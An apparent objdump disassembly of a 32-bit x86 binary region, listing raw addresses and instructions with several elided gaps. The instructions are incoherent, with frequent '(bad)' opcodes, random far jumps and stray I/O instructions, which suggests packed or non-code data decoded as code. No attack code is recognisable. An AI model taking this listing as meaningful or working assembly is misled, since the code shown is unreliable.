  41be8b:	test   BYTE PTR [ebx-0x20],cl
  41be8e:	ins    BYTE PTR es:[edi],dx
  41be8f:	and    eax,DWORD PTR [esi+ebp*1-0x18ca493a]
  41be96:	(bad)  
  41be97:	clc    
  41be98:	fidivr WORD PTR [eax+0x74e116b4]
  41be9e:	in     eax,dx
  41be9f:	push   0x4b420b2b
  41bea4:	addr16 jge 0x41bf02
  41bea7:	test   eax,0x12d45402
  41beac:	push   ds
  41bead:	fcom   DWORD PTR [ecx]
  41beaf:	ins    BYTE PTR es:[edi],dx
  41beb0:	mov    WORD PTR [eax+0x29dcbc2f],?
  41beb6:	adc    al,0xb6
  41beb8:	pop    es
  41beb9:	or     ch,BYTE PTR [esi+0x68dc5102]
  41bebf:	jne    0x41be5a
  41bec1:	test   eax,0xad2742e6
  41bec6:	mov    edi,eax
  41bec8:	mov    DWORD PTR [edi-0x6b],ebx
  41becb:	mov    BYTE PTR [ebx+0x4c1733aa],bh
  41bed1:	(bad)  
  41bed2:	repnz adc eax,0x619fe0d9
  41bed8:	xor    ebx,esi
  41beda:	jg     0x41be93
  41bedc:	jmp    0x1386:0xb8bead22
  41bee3:	or     DWORD PTR [ebp+esi*4-0x7b171ea1],ebp
  41beea:	push   ebx
  41beeb:	sub    eax,edi
  41beed:	nop
  41beee:	dec    ebx
  41beef:	scas   al,BYTE PTR es:[edi]
  41bef0:	and    al,0x23
  41bef2:	or     dl,BYTE PTR [edi-0x72fa6e32]
  41bef8:	xor    DWORD PTR [eax-0x6b],eax
  41befb:	rcl    DWORD PTR [edi],cl
  41befd:	jecxz  0x41bf49
  41beff:	sbb    al,0x2b
  41bf01:	mov    bl,0x16
  41bf03:	jbe    0x41bf32
  41bf05:	dec    ebx
  41bf06:	arpl   WORD PTR [edx+0x5052416c],ax
  41bf0c:	mov    al,ds:0x7da97933
  41bf11:	or     ch,dl
  41bf13:	jmp    0x6c10dbed
  41bf18:	cmp    cl,BYTE PTR [ebp+0x43e2287e]
  41bf1e:	aad    0x3e
  41bf20:	aam    0x5d
  41bf22:	fcmove st,st(1)
  41bf24:	jmp    0xed1f1525
  41bf29:	xlat   BYTE PTR ds:[ebx]
  41bf2a:	or     al,0x43
  41bf2c:	xchg   edx,eax
  41bf2d:	xchg   esp,eax
  41bf2e:	ficomp DWORD PTR [ebx+ebx*2]
  41bf31:	sar    BYTE PTR [esi],0x53
  41bf34:	jecxz  0x41bf36
	...
  41bf96:	fs jae 0x41bfcc
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	mov    eax,ds:0x470a8c6c
  41bfa7:	daa    
  41bfa8:	add    DWORD PTR [eax],eax
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    dl,dh
  41bfaf:	push   eax
  41bfb0:	mov    edx,edi
  41bfb2:	sbb    DWORD PTR [edx+0x0],ecx
  41bfb5:	jl     0x41bfa8
  41bfb7:	fdiv   st(4),st
  41bfb9:	and    bh,BYTE PTR [esi]
  41bfbb:	(bad)  
  41bfbc:	rol    DWORD PTR [esp+eax*4-0x4d371b4e],cl
  41bfc3:	fistp  QWORD PTR [ebp+0x9708dfa]
  41bfc9:	lock repnz xchg edi,eax
  41bfcc:	dec    edi
  41bfcd:	fwait
  41bfce:	sbb    DWORD PTR [esi],ecx
  41bfd0:	imul   eax,DWORD PTR [ecx],0xffffffcd
  41bfd3:	fidivr WORD PTR [ecx-0x7b]
  41bfd6:	test   esp,eax
  41bfd8:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41bfda:	mov    ecx,DWORD PTR [edi-0x30]
  41bfdd:	mov    ecx,DWORD PTR [eax-0x50]
  41bfe0:	(bad)  
  41bfe1:	je     0x41c04d
  41bfe3:	loope  0x41bf8d
  41bfe5:	xor    eax,0x80a59aea
  41bfea:	pop    esp
  41bfeb:	jb     0x41bf8f
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	push   es
  41bfef:	pop    ds
  41bff0:	fstp   DWORD PTR [ecx-0x3d4ae9aa]
  41bff6:	sbb    eax,0x8dd1698b
  41bffb:	ret    0x4587
  41bffe:	pop    esp
  41bfff:	mov    es,WORD PTR [esi+0x5e]
  41c002:	adc    BYTE PTR [ecx-0x43c16c77],ch
  41c008:	jbe    0x41bfd6
  41c00a:	push   esi
  41c00b:	add    BYTE PTR [edi+0x3553c370],cl
  41c011:	mov    al,bl
  41c013:	and    edx,DWORD PTR [esi]
  41c015:	pop    ebx
  41c016:	xchg   edi,eax
  41c017:	mov    dh,0xb6
  41c019:	ins    DWORD PTR es:[edi],dx
  41c01a:	pcmpgtb mm6,QWORD PTR ds:0x42a019fd
  41c021:	jecxz  0x41bfca
  41c023:	ja     0x41bfb5
  41c025:	fisttp WORD PTR [ebx+0x57303da7]
  41c02b:	retf   
  41c02c:	jmp    0x26ef:0xa7198138
  41c033:	out    0x66,al
  41c035:	mov    gs,WORD PTR [ebx+0x44]
  41c038:	aam    0x67
  41c03a:	int    0x8b
  41c03c:	dec    esi
  41c03d:	ins    DWORD PTR es:[edi],dx
  41c03e:	jae    0x41bffb
  41c040:	xchg   edi,eax
  41c041:	mov    edi,0xfaffb43f
  41c046:	sbb    eax,0x6546d884
  41c04b:	icebp  
  41c04c:	mov    ch,0x3d
  41c04e:	jbe    0x41bfea
  41c050:	stos   BYTE PTR es:[edi],al
  41c051:	jmp    0x1026:0xf749596f
  41c058:	xchg   ebx,eax
  41c059:	mov    ds,WORD PTR [edi]
  41c05b:	xlat   BYTE PTR ds:[ebx]
  41c05c:	dec    esp
  41c05d:	(bad)  
  41c05e:	(bad)  [ebp-0x39b03a98]
  41c064:	shl    DWORD PTR [ebx+edx*8+0x44],0xfa
  41c069:	sbb    eax,0x7eadee9a
  41c06e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c06f:	sahf   
  41c070:	test   eax,0x6534f938
  41c075:	stc    
  41c076:	out    dx,al
  41c077:	fmul   DWORD PTR [ecx]
  41c079:	sub    eax,0xd2945cf2
  41c07e:	jmp    0x41c0dd
  41c080:	out    0x1a,eax
  41c082:	xor    ah,BYTE PTR [edx-0x44]
  41c085:	repz test eax,0x325c455b
  41c08b:	jle    0x41c037
  41c08d:	int    0x93
  41c08f:	test   DWORD PTR [ecx-0x54],0xea65487d
  41c096:	cmp    al,0xbf
  41c098:	(bad)  
  41c099:	lods   eax,DWORD PTR ds:[esi]
  41c09a:	daa    
  41c09b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c09c:	jle    0x41c085
  41c09e:	ins    DWORD PTR es:[edi],dx
  41c09f:	rcr    BYTE PTR [ebx-0x5e],cl
  41c0a2:	and    al,BYTE PTR [edi-0x2e8ca88]
  41c0a8:	xor    DWORD PTR [ebx+0x59],0x71
  41c0ac:	pushf  
  41c0ad:	or     edx,DWORD PTR [edx-0x78]
  41c0b0:	nop
  41c0b1:	mov    al,0x3
  41c0b3:	test   al,0xe2
	...
  41c115:	add    cl,bl
  41c117:	dec    edx
  41c118:	mov    eax,ds:0xd9fbb3f8
  41c11d:	imul   ecx,DWORD PTR [ecx-0x29],0xffffffbd
  41c121:	clc    
  41c122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c123:	repnz pop ds
  41c125:	popa   
  41c126:	dec    esi
  41c127:	sub    BYTE PTR [ecx],al
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    dh,ch
  41c12f:	fs mov ah,0x24
  41c132:	cmp    dh,0x3d
  41c135:	das    
  41c136:	push   eax
  41c137:	div    DWORD PTR [edi-0x28]
  41c13a:	add    DWORD PTR [edx+edi*8],edx
  41c13d:	add    BYTE PTR [edx+eax*4-0x1cde868],bh
  41c144:	shl    BYTE PTR [ecx],cl
  41c146:	adc    al,0x20
  41c148:	cwde   
  41c149:	rol    DWORD PTR [eax+0x54],1
  41c14c:	jmp    0x3185adc6
  41c151:	lods   eax,DWORD PTR ds:[esi]
  41c152:	push   edi
  41c153:	cwde   
  41c154:	cmp    DWORD PTR [edi+ebp*4],0xfffffffb
  41c158:	jp     0x41c1cd
  41c15a:	fld    QWORD PTR [edi-0x3e]
  41c15d:	xor    DWORD PTR [edi],ebp
  41c15f:	jg     0x41c16a
  41c161:	gs neg dh
  41c164:	aad    0xff
  41c166:	pop    esi
  41c167:	call   0x4cfa57d2
  41c16c:	cmp    esp,DWORD PTR [edx+0x7a705f07]
  41c172:	stos   DWORD PTR es:[edi],eax
  41c173:	and    eax,0x7e4f5efd
  41c178:	imul   DWORD PTR [ebx+0x2a]
  41c17b:	xor    BYTE PTR [edi],cl
  41c17d:	lea    eax,[eax-0x5f143323]
  41c183:	notrack call DWORD PTR [eax-0x3dca92ee]
  41c18a:	ret    0x8f39
  41c18d:	mov    ecx,0x2cb403e4
  41c192:	fadd   QWORD PTR [edx]
  41c194:	push   ebp
  41c195:	jp     0x41c149
  41c197:	jno    0x41c214
  41c199:	mov    ecx,0x269da5f5
  41c19e:	(bad)  
  41c19f:	icebp  
  41c1a0:	es test eax,0xc49f466
  41c1a6:	jno    0x41c1d0
  41c1a8:	data16 mov bh,0x9f
  41c1ab:	mov    edx,0xb49826bc
  41c1b0:	mov    dh,0xb0
  41c1b2:	inc    ebx
  41c1b3:	inc    ecx
  41c1b4:	mov    ds:0x7e9af4dc,al
  41c1b9:	cmp    dh,BYTE PTR [edi]
  41c1bb:	dec    edi
  41c1bc:	ja     0x41c1b9
  41c1be:	repnz fsub st,st(2)
  41c1c1:	mov    ecx,edi
  41c1c3:	sbb    ch,BYTE PTR [esi+edi*2+0x27]
  41c1c7:	cmp    BYTE PTR [edi+edi*2+0x5a],bl
  41c1cb:	dec    ebp
  41c1cc:	push   ds
  41c1cd:	xor    ecx,DWORD PTR [eax+0x5f17e6d2]
  41c1d3:	outs   dx,DWORD PTR ds:[esi]
  41c1d4:	pop    ecx
  41c1d5:	rcl    DWORD PTR [ebp+eax*8+0x1eaef203],1
  41c1dc:	cld    
  41c1dd:	pusha  
  41c1de:	adc    al,0xf
  41c1e0:	pop    eax
  41c1e1:	dec    eax
  41c1e2:	(bad)  
  41c1e4:	sbb    al,0xfc
  41c1e6:	jecxz  0x41c23f
  41c1e8:	push   0x32
  41c1ea:	mov    al,ds:0x82539ddf
  41c1ef:	fs inc ebx
  41c1f1:	dec    edx
  41c1f2:	mov    dh,0x80
  41c1f4:	adc    esi,DWORD PTR [eax-0x5d]
  41c1f7:	pop    esp
  41c1f8:	imul   eax,DWORD PTR [ebx],0x13
  41c1fb:	sbb    eax,0xe37e5043
  41c200:	into   
  41c201:	outs   dx,BYTE PTR ds:[esi]
  41c202:	jg     0x41c1be
  41c204:	cmovp  esp,DWORD PTR [eax]
  41c207:	rol    DWORD PTR [eax],1
  41c209:	mov    edx,0x8dd5499e
  41c20e:	ficomp WORD PTR [esi-0x474132f]
  41c214:	jnp    0x41c1fa
  41c216:	fwait
  41c217:	or     eax,0xf26671a3
  41c21c:	addr16 sub eax,0x816d6dd4
  41c222:	and    BYTE PTR [ecx+edx*4-0x58152871],bh
  41c229:	inc    edi
  41c22a:	(bad)  
  41c22b:	stos   DWORD PTR es:[edi],eax
  41c22c:	jl     0x41c24e
  41c22e:	mov    ebx,0xc06fadac
  41c233:	pop    esi
  41c234:	add    BYTE PTR es:[eax],al
	...
  41c293:	add    BYTE PTR [eax],al
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	int3   
  41c2a3:	adc    DWORD PTR [ecx+0x12955bb],edi
  41c2a9:	add    BYTE PTR [edi],al
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    al,cl
  41c2af:	and    al,0xb2
  41c2b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2b2:	fwait
  41c2b3:	jne    0x41c24b
  41c2b5:	sbb    ah,bl
  41c2b7:	push   ebx
  41c2b8:	dec    edx
  41c2b9:	clc    
  41c2ba:	ja     0x41c2db
  41c2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2bd:	inc    eax
  41c2be:	pop    ebx
  41c2bf:	mov    fs,WORD PTR es:[ebx]
  41c2c2:	fldcw  WORD PTR [edx+0x564d2dc1]
  41c2c8:	test   DWORD PTR [edx+0x706a8b41],ebx
  41c2ce:	dec    ecx
  41c2cf:	push   ss
  41c2d0:	mov    cs,WORD PTR [ebx+0x62906821]
  41c2d6:	ja     0x41c2f7
  41c2d8:	add    ah,BYTE PTR [ecx+0x2bf3f11c]
  41c2de:	sub    al,0x6d
  41c2e0:	iret   
  41c2e1:	dec    edi
  41c2e2:	dec    ebp
  41c2e3:	or     BYTE PTR [edi],bh
  41c2e5:	lods   eax,DWORD PTR ds:[esi]
  41c2e6:	push   0x5faaaa49
  41c2eb:	(bad)  
  41c2ec:	aas    
  41c2ed:	push   edx
  41c2ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2ef:	jne    0x41c2b0
  41c2f1:	mov    WORD PTR [edi+0x129c0aec],?
  41c2f7:	cdq    
  41c2f8:	add    dh,BYTE PTR [esi+esi*1+0x5f]
  41c2fc:	in     eax,0xbc
  41c2fe:	adc    BYTE PTR [ecx+ebx*2-0x4ea0bc51],0xb
  41c306:	cmp    DWORD PTR [esi],ebp
  41c308:	mov    eax,ds:0x14679ea2
  41c30d:	mov    ch,BYTE PTR [ebp-0x79]
  41c310:	scas   al,BYTE PTR es:[edi]
  41c311:	test   BYTE PTR [ebx+0x56e29e02],bh
  41c317:	xor    DWORD PTR [ebx],esi
  41c319:	push   ecx
  41c31a:	addr16 push edi
  41c31c:	int3   
  41c31d:	aaa    
  41c31e:	iret   
  41c31f:	nop    ebx
  41c322:	fwait
  41c323:	xchg   esp,eax
  41c324:	popf   
  41c325:	or     dl,BYTE PTR [eax+ebp*8+0x27]
  41c329:	push   cs
  41c32a:	iret   
  41c32b:	mov    ds:0x40ff7c8f,al
  41c330:	inc    ebx
  41c331:	mov    bh,0x93
  41c333:	call   0xa546a35e
  41c338:	adc    eax,0x1719401
  41c33d:	jne    0x41c353
  41c33f:	and    al,0xf6
  41c341:	xchg   esp,eax
  41c342:	test   DWORD PTR [esi+edi*4-0x3],ebx
  41c346:	push   edi
  41c347:	mov    cl,0x16
  41c349:	sub    ebx,DWORD PTR [eax-0x1]
  41c34c:	jmp    0x41c3bf
  41c34e:	and    al,0x4b
  41c350:	das    
  41c351:	mov    esp,0xc6a581da
  41c356:	dec    esp
  41c357:	into   
  41c358:	jns    0x41c360
  41c35a:	sti    
  41c35b:	mov    esp,0x40246dea
  41c360:	clc    
  41c361:	shl    DWORD PTR [edx+0x2635322c],0x66
  41c368:	in     eax,dx
  41c369:	idiv   esi
  41c36b:	push   0xea395c50
  41c370:	cmp    eax,0x5a6fcd0e
  41c375:	fcomp  DWORD PTR [ebx+0x42743136]
  41c37b:	loope  0x41c326
  41c37d:	outs   dx,DWORD PTR ds:[esi]
  41c37e:	and    al,0x93
  41c380:	or     BYTE PTR [eax+0x30],al
  41c383:	add    DWORD PTR [edi],esi
  41c385:	ds jp  0x41c35c
  41c388:	loopne 0x41c31c
  41c38a:	inc    ebp
  41c38b:	scas   eax,DWORD PTR es:[edi]
  41c38c:	xor    edx,edi
  41c38e:	mov    ebp,0x37b9fce9
  41c393:	sbb    ecx,edx
  41c395:	test   DWORD PTR [eax],ecx
  41c397:	popa   
  41c398:	(bad)
  41c39c:	push   ebp
  41c39d:	push   cs
  41c39e:	addr16 cld 
  41c3a0:	inc    edx
  41c3a1:	stos   BYTE PTR es:[edi],al
  41c3a2:	adc    ebx,ebp
  41c3a4:	mov    ebx,0xca77d193
  41c3a9:	lods   eax,DWORD PTR ds:[esi]
  41c3aa:	out    dx,al
  41c3ab:	mov    al,ds:0x4b031532
  41c3b0:	adc    eax,0x625efa16
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [edi+eax*2+0x28]
  41c424:	sar    BYTE PTR [esi],0x5c
  41c427:	sub    al,BYTE PTR [ecx]
  41c429:	add    BYTE PTR [edi],al
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [ebx+0x6f801169],bl
  41c433:	mov    WORD PTR [edi+0x640bf155],ds
  41c439:	dec    ecx
  41c43a:	aas    
  41c43b:	mov    eax,0x1cd93d91
  41c440:	cwde   
  41c441:	sbb    ah,al
  41c443:	test   BYTE PTR [edx-0x73],dh
  41c446:	jne    0x41c4a2
  41c448:	out    0xd6,eax
  41c44a:	jns    0x41c424
  41c44c:	mov    ebx,0xc364595a
  41c451:	mov    fs,WORD PTR [ebp-0x15b3ff19]
  41c457:	mov    eax,0x23c13a9
  41c45c:	sbb    BYTE PTR [esp+eax*2],bl
  41c45f:	mov    DWORD PTR [ebx-0x6b],ecx
  41c462:	add    BYTE PTR [esi-0x57],bl
  41c465:	das    
  41c466:	push   edx
  41c467:	(bad)  
  41c468:	xor    DWORD PTR [edx+0x39a806ed],edx
  41c46e:	(bad)  
  41c46f:	jmp    0x41c403
  41c471:	push   ebp
  41c472:	cmp    al,BYTE PTR [eax+0x5f]
  41c475:	sbb    ebx,DWORD PTR [edi+ebp*2+0x2a2d3fbb]
  41c47c:	sahf   
  41c47d:	inc    esi
  41c47e:	push   eax
  41c47f:	lock add al,0x34
  41c482:	mov    dl,0x21
  41c484:	inc    ebp
  41c485:	jge    0x41c4e2
  41c487:	add    al,0x87
  41c489:	xchg   ecx,eax
  41c48a:	call   0xade598f5
  41c48f:	in     al,0x58
  41c491:	or     DWORD PTR [eax+0x286c643c],eax
  41c497:	pop    edi
  41c498:	bound  ecx,QWORD PTR [ecx+0x3544b5bd]
  41c49e:	fidiv  DWORD PTR [esi+0x30e13392]
  41c4a4:	int    0x84
  41c4a6:	mov    dh,0x65
  41c4a8:	or     BYTE PTR [eax],bh
  41c4aa:	sub    cl,cl
  41c4ac:	jo     0x41c480
  41c4ae:	cvtdq2ps xmm4,xmm5
  41c4b1:	out    0xfa,eax
  41c4b3:	dec    ecx
  41c4b4:	jo     0x41c52c
  41c4b6:	mov    gs,WORD PTR [edx+ebx*1]
  41c4b9:	sub    esp,edx
  41c4bb:	add    eax,0x58e03192
  41c4c0:	push   0xffffff9b
  41c4c2:	cmp    BYTE PTR [edx+0x6c],dl
  41c4c5:	jp     0x41c469
  41c4c7:	push   edi
  41c4c8:	pusha  
  41c4c9:	sbb    DWORD PTR [edi],0xffffff8f
  41c4cc:	xor    al,dl
  41c4ce:	imul   ebx,ecx,0x434bf983
  41c4d4:	and    ecx,DWORD PTR [edx+0x26700ff6]
  41c4da:	(bad)  
  41c4db:	out    dx,al
  41c4dc:	and    cl,BYTE PTR [edi*4+0x2febf3d9]
  41c4e3:	shr    BYTE PTR [edi],0xf1
  41c4e6:	test   al,0x41
  41c4e8:	push   0xfe602fd2
  41c4ed:	outs   dx,DWORD PTR ds:[esi]
  41c4ee:	inc    edx
  41c4ef:	stos   BYTE PTR es:[edi],al
  41c4f0:	pop    edx
  41c4f1:	jbe    0x41c509
  41c4f3:	iret   
  41c4f4:	pop    esi
  41c4f5:	inc    edi
  41c4f6:	fdiv   st(6),st
  41c4f8:	pusha  
  41c4f9:	mov    esi,ebx
  41c4fb:	ret    
  41c4fc:	dec    edx
  41c4fd:	dec    ebx
  41c4fe:	and    ah,bl
  41c500:	add    dh,BYTE PTR [esi+0x4]
  41c503:	adc    ebp,ecx
  41c505:	cmp    esi,edx
  41c507:	adc    eax,0x53fc5bf1
  41c50c:	lea    eax,[esi]
  41c50e:	add    ch,BYTE PTR [esi]
  41c510:	lock imul ecx,esp,0x69
  41c514:	mov    ch,0x65
  41c516:	push   es
  41c517:	(bad)  
  41c518:	icebp  
  41c519:	jmp    0xfc24c5c
  41c51e:	and    bh,BYTE PTR [eax+0x7d]
  41c521:	jle    0x41c54d
  41c523:	pop    es
  41c524:	addr16 and eax,0xeaf7815f
  41c52a:	jecxz  0x41c53f
  41c52c:	repnz sub DWORD PTR [esi],esp
  41c52f:	outs   dx,BYTE PTR ds:[esi]
  41c530:	inc    edx
  41c531:	xor    bl,BYTE PTR [ebp-0x7d]
  41c534:	add    DWORD PTR [eax],0x0
	...
  41c593:	add    BYTE PTR [eax],al
  41c595:	add    ch,al
  41c597:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c59d:	jecxz  0x41c5b9
  41c59f:	push   0x10
  41c5a1:	stc    
  41c5a2:	push   edx
  41c5a3:	pop    edi
  41c5a4:	clc    
  41c5a5:	dec    edi
  41c5a6:	arpl   WORD PTR [ebx],bp
  41c5a8:	add    DWORD PTR [eax],eax
  41c5aa:	pop    es
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    BYTE PTR [edx+0x3c],bh
  41c5b0:	mov    ebp,0xc032b6c5
  41c5b5:	and    BYTE PTR [eax+edi*4+0x67],cl
  41c5b9:	lock dec ebp
  41c5bb:	add    eax,0xda9cef33
  41c5c0:	daa    
  41c5c1:	pop    ebx
  41c5c2:	xchg   ebp,eax
  41c5c3:	mov    bl,0xfc
  41c5c5:	out    0x45,eax
  41c5c7:	mov    fs,ebx
  41c5c9:	mov    eax,ds:0x866682fb
  41c5ce:	popa   
  41c5cf:	sub    BYTE PTR ds:0x5635f0a6,al
  41c5d5:	inc    edx
  41c5d6:	repz xor al,BYTE PTR [eax-0x643e3ac0]
  41c5dd:	mov    cl,0x91
  41c5df:	jg     0x41c5e4
  41c5e1:	fsubrp st(6),st
  41c5e3:	shl    cl,0x84
  41c5e6:	das    
  41c5e7:	inc    edi
  41c5e8:	loopne 0x41c659
  41c5ea:	mov    ah,0x2e
  41c5ec:	xchg   esp,eax
  41c5ed:	pop    edx
  41c5ee:	xchg   edx,eax
  41c5ef:	mov    cl,0x9d
  41c5f1:	push   edx
  41c5f2:	add    esi,DWORD PTR [eax-0x3]
  41c5f5:	aaa    
  41c5f6:	retf   
  41c5f7:	or     DWORD PTR [eax],0xffffffb5
  41c5fa:	pop    ebx
  41c5fb:	neg    DWORD PTR [ebx]
  41c5fd:	into   
  41c5fe:	retf   
  41c5ff:	push   0xfffffff1
  41c601:	pop    edi
  41c602:	mov    al,0x6b
  41c604:	call   0x5181e0f0
  41c609:	cmp    BYTE PTR [edi],bh
  41c60b:	inc    eax
  41c60c:	add    dl,BYTE PTR [esi]
  41c60e:	pop    ebx
  41c60f:	imul   edi,DWORD PTR [eax+ebx*1-0x3920c9a3],0x28db528
  41c61a:	je     0x41c627
  41c61c:	mov    WORD PTR [ecx-0x73014406],?
  41c622:	fidiv  WORD PTR [edi]
  41c624:	pusha  
  41c625:	sahf   
  41c626:	xor    al,0x37
  41c628:	mov    bh,0x20
  41c62a:	das    
  41c62b:	shld   DWORD PTR [esi],esp,cl
  41c62e:	or     DWORD PTR [esi],ebp
  41c630:	cmp    ebp,DWORD PTR [esi]
  41c632:	cmp    DWORD PTR [eax-0x1c962e17],0xffffffc7
  41c639:	fmul   DWORD PTR [esi-0x73e1c5c6]
  41c63f:	fmul   QWORD PTR [esi-0x3d00befd]
  41c645:	push   ecx
  41c646:	(bad)  
  41c647:	pop    ecx
  41c648:	sbb    bh,dh
  41c64a:	and    BYTE PTR [eax+0x16],bh
  41c64d:	das    
  41c64e:	pop    ebx
  41c64f:	ret    
  41c650:	jg     0x41c642
  41c652:	jns    0x41c61f
  41c654:	rcl    BYTE PTR [ebx],1
  41c656:	push   0x78c64e1d
  41c65b:	cmp    dh,bh
  41c65d:	mov    esi,0xe254a5fd
  41c662:	push   eax
  41c663:	and    dl,BYTE PTR [ebp-0x27]
  41c666:	scas   eax,DWORD PTR es:[edi]
  41c667:	push   edx
  41c668:	add    edi,DWORD PTR [ebx+0x6e]
  41c66b:	clc    
  41c66c:	dec    esp
  41c66d:	aas    
  41c66e:	adc    cl,cl
  41c670:	aam    0xb4
  41c672:	mov    ebp,0xd688d7c8
  41c677:	adc    edi,esp
  41c679:	push   eax
  41c67a:	(bad)  
  41c67b:	sbb    eax,0xd62459
  41c680:	rcr    DWORD PTR [esi-0xa6a921b],1
  41c686:	inc    DWORD PTR [ebx-0x6d0f89b2]
  41c68c:	jbe    0x41c67c
  41c68e:	adc    BYTE PTR [edi],0x4c
  41c691:	sbb    BYTE PTR [esi],al
  41c693:	ret    0xf9d5
  41c696:	push   edx
  41c697:	and    ebp,DWORD PTR [ecx+0xc]
  41c69a:	int3   
  41c69b:	lds    edx,FWORD PTR [esi]
  41c69d:	mov    cl,0x4e
  41c69f:	mov    dh,0x9b
  41c6a1:	mov    dh,0xe4
  41c6a3:	push   edi
  41c6a4:	nop
  41c6a5:	in     al,0xce
  41c6a7:	xchg   esp,eax
  41c6a8:	push   ss
  41c6a9:	sbb    BYTE PTR [eax+0x3a],dh
  41c6ac:	push   edi
  41c6ad:	rcr    DWORD PTR [eax+0x18],1
  41c6b0:	pop    edx
  41c6b1:	xrelease mov DWORD PTR [edi+esi*1+0x0],ebx
	...
  41c716:	fiadd  DWORD PTR [ecx]
  41c718:	ret    0xdb86
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	sbb    al,bh
  41c724:	or     bh,dl
  41c726:	push   0x2c
  41c728:	add    DWORD PTR [eax],eax
  41c72a:	pop    es
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [ebx],cl
  41c72f:	xchg   ebx,eax
  41c730:	repnz mov WORD PTR [edi],gs
  41c733:	xchg   DWORD PTR [ebx],ebp
  41c735:	or     bh,BYTE PTR [ebp+0x43]
  41c738:	call   0x8c10:0x570d1686
  41c73f:	dec    eax
  41c740:	mov    eax,ds:0x7c4981cf
  41c745:	xchg   esp,eax
  41c746:	sbb    eax,0xe6e3a549
  41c74b:	sub    BYTE PTR [esi-0x4d98c8ca],al
  41c751:	leave  
  41c752:	xor    eax,0x1fe93bab
  41c757:	dec    eax
  41c758:	bound  esi,QWORD PTR [ebp+0x32c02bdf]
  41c75e:	cmp    BYTE PTR [ecx-0x1f],dl
  41c761:	add    ecx,DWORD PTR [edi+ecx*1-0x61210a51]
  41c768:	add    BYTE PTR [edx],bl
  41c76a:	push   ebp
  41c76b:	loop   0x41c7c8
  41c76d:	out    dx,al
  41c76e:	shl    BYTE PTR [edx+0x3df69c25],cl
  41c774:	stc    
  41c775:	cmp    ah,dh
  41c777:	adc    DWORD PTR [ebx-0x1d86c9b6],esp
  41c77d:	fmul   st(4),st
  41c77f:	cmp    BYTE PTR [edi],cl
  41c781:	test   DWORD PTR [ecx],ebp
  41c783:	popa   
  41c784:	into   
  41c785:	arpl   WORD PTR [esi+0x26],bp
  41c788:	js     0x41c779
  41c78a:	ins    DWORD PTR es:[edi],dx
  41c78b:	scas   eax,DWORD PTR es:[edi]
  41c78c:	inc    ebx
  41c78d:	mov    eax,ds:0xc23a4726
  41c792:	lods   eax,DWORD PTR ds:[esi]
  41c793:	(bad)  
  41c794:	jle    0x41c758
  41c796:	aas    
  41c797:	cmp    eax,0x18a80424
  41c79c:	popa   
  41c79d:	scas   eax,DWORD PTR es:[edi]
  41c79e:	or     dh,ch
  41c7a0:	xchg   ecx,eax
  41c7a1:	in     al,0xba
  41c7a3:	popw   ss
  41c7a5:	xlat   BYTE PTR ds:[ebx]
  41c7a6:	ins    BYTE PTR es:[edi],dx
  41c7a7:	dec    esi
  41c7a8:	lahf   
  41c7a9:	inc    ebp
  41c7aa:	cmc    
  41c7ab:	inc    esi
  41c7ac:	cmp    cl,BYTE PTR [ebx+edi*8+0x49b2824e]
  41c7b3:	bound  edi,QWORD PTR [edx]
  41c7b5:	aad    0xf
  41c7b7:	xor    cl,BYTE PTR [esi*1+0x161f613c]
  41c7be:	xlat   BYTE PTR ds:[ebx]
  41c7bf:	mov    ch,0x2
  41c7c1:	mov    edx,0x6f58177f
  41c7c6:	jle    0x41c7ef
  41c7c8:	xchg   ebp,eax
  41c7c9:	jae    0x41c814
  41c7cb:	mov    ecx,ebx
  41c7cd:	mov    ch,0xe9
  41c7cf:	sti    
  41c7d0:	out    0x50,eax
  41c7d2:	(bad)  
  41c7d3:	rol    bl,cl
  41c7d5:	(bad)  
  41c7d6:	out    0x73,al
  41c7d8:	aam    0x1
  41c7da:	fwait
  41c7db:	inc    ebx
  41c7dc:	sbb    dl,al
  41c7de:	adc    dh,bl
  41c7e0:	sbb    eax,0xefe97652
  41c7e5:	or     al,0x62
  41c7e7:	inc    edx
  41c7e8:	mov    dh,0x6
  41c7ea:	mov    dh,0x64
  41c7ec:	imul   ebx,DWORD PTR [ebx-0xbe8a6c2],0xffffffa1
  41c7f3:	dec    eax
  41c7f4:	mov    es,WORD PTR [ecx]
  41c7f6:	out    dx,eax
  41c7f7:	jmp    0x2961e7b2
  41c7fc:	xchg   ecx,eax
  41c7fd:	mov    BYTE PTR [edi-0x18d7bc2e],dl
  41c803:	outs   dx,DWORD PTR cs:[esi]
  41c805:	add    DWORD PTR [edx+0x51df7044],ebx
  41c80b:	or     eax,0xd5574211
  41c810:	lea    ecx,[esp+ecx*1-0x32e24eb9]
  41c817:	ret    0x1d01
  41c81a:	jle    0x41c819
  41c81c:	mov    al,ds:0xbb4647c4
